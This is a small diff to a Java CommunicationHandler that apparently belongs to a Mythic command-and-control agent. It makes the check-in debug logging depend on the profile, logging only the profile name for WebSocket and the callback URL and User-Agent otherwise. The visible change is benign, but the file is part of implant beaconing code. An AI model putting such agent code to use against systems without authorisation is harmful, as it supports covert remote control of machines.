@@ -71,8 +71,13 @@ public class CommunicationHandler {
         }
         
         Config.debugLog(config, "=== CHECKIN REQUEST ===");
-        Config.debugLog(config, "URL: " + config.getCallbackUrl() + config.getPostUri());
-        Config.debugLog(config, "User-Agent: " + config.getUserAgent());
+        // Profile-aware debug logging
+        if ("websocket".equals(profile.getProfileName())) {
+            Config.debugLog(config, "Profile: WebSocket");
+        } else {
+            Config.debugLog(config, "URL: " + config.getCallbackUrl() + config.getPostUri());
+            Config.debugLog(config, "User-Agent: " + config.getUserAgent());
+        }
         
         // Build Mythic checkin JSON with all required fields
         Map<String, Object> checkinData = new HashMap<>();
